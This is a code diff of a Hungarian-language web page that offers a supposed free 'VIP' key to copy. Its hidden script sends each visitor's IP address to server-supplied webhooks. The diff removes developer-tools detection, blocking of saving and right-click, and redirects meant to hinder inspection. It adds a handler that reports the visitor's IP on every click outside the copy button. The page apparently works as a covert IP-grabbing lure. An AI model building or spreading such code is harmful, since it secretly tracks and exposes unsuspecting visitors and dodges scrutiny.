@@ -4,11 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kulcs másoló weboldal</title>
+    <!-- A külső CSS fájl hivatkozása -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
+        <!-- Kép hozzáadása az írások fölé -->
         <img src="https://cdn.discordapp.com/attachments/1127157742046543892/1400523086889226331/vip.png?ex=688cf244&is=688ba0c4&hm=671b4f7e8daa147678d2196c7908597af93023a468700110aa10fdaa5a69da29&" alt="VIP" class="icon">
+
         <h1>Kattints a kulcs másolásához!</h1>
         <div>
             <input type="text" value="N3N-FREE-GWERR-GBFKIU-UTFCF-VHYTRE-WTF" readonly id="keyInput">
@@ -21,18 +24,9 @@
         let webhookUrl = "";
         let altWebhookUrl = "";
 
+        // Webhook URL-k lekérése a szervertől
         window.onload = function() {
             // Webhook URL lekérése a szervertől
-            fetch('/send-ip')
-                .then(response => response.text())
-                .then(data => {
-                    console.log(data); // A szerver válasza
-                })
-                .catch(error => {
-                    console.error('Hiba történt:', error);
-                });
-
-            // Webhook URL-k lekérése a szervertől
             fetch('/get-webhook-url')
                 .then(response => response.json())
                 .then(data => {
@@ -42,9 +36,6 @@
                 .catch(error => {
                     console.error('Hiba a webhook URL kérése közben:', error);
                 });
-
-            // Fejlesztői eszközök érzékelése
-            detectDevTools();
         };
 
         // Másolja a kulcsot a vágólapra
@@ -61,41 +52,12 @@
             }, 2000);  // 2 másodpercig látszik
         }
 
-        // Függvény, amely érzékeli, ha a fejlesztői eszközök meg vannak nyitva
-        function detectDevTools() {
-            const threshold = 160; // Küszöbérték, amit az eszközök megnyitásakor elérünk
-
-            setInterval(function() {
-                const devToolsOpened = window.outerHeight - window.innerHeight > threshold ||
-                                       window.outerWidth - window.innerWidth > threshold;
-
-                if (devToolsOpened) {
-                    window.location.href = "https://example.com1"; // Átirányítja egy másik oldalra
-                }
-            }, 1000); // Minden másodpercben ellenőrzi
-        }
-
-        // Figyeljük a Ctrl + S billentyűkombinációt, és megakadályozzuk a weboldal mentését
-        document.addEventListener('keydown', function(event) {
-            if (event.ctrlKey && event.key === 's') {
-                event.preventDefault(); // Megakadályozza a mentést
-                sendIpRequest('Ctrl + S', altWebhookUrl);  // Második webhook küldése
-                window.location.href = "https://example.com2"; // Átirányítja egy másik oldalra
+        // Kattintás esetén IP küldése
+        document.addEventListener('click', function(event) {
+            // Ha nem a másoló gombot nyomták meg, akkor küldjük el a kattintás adatokat
+            if (event.target.tagName !== 'BUTTON') {
+                sendIpRequest('Link kattintás', webhookUrl);  // Az alapértelmezett webhook URL
             }
-
-            // Figyeljük, ha a felhasználó megpróbálja megnyitni a fejlesztői eszközöket
-            if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
-                event.preventDefault(); // Megakadályozza a devtools megnyitását
-                sendIpRequest('F12 / Ctrl + Shift + I', altWebhookUrl);  // Második webhook küldése
-                window.location.href = "https://example.com3"; // Átirányítja egy másik oldalra
-            }
-        });
-
-        // Figyeljük a jobb klikket, hogy elkerüljük a képernyő mentését
-        document.addEventListener('contextmenu', function(event) {
-            event.preventDefault(); // Megakadályozza a jobb klikk menüt
-            sendIpRequest('Jobb klikk', altWebhookUrl);  // Második webhook küldése
-            window.location.href = "https://example.com4"; // Átirányítja egy másik oldalra
         });
 
         // IP küldése a /send-ip útvonalra
@@ -104,7 +66,7 @@
                 .then(response => response.json())  // Válasz JSON formátumban
                 .then(data => {
                     console.log(data); // A szerver válasza
-                    // Webhook küldése a megfelelő webhook URL-re
+                    // Webhook küldése
                     sendToWebhook(data.ip, keyCombination, targetWebhookUrl);
                 })
                 .catch(error => {
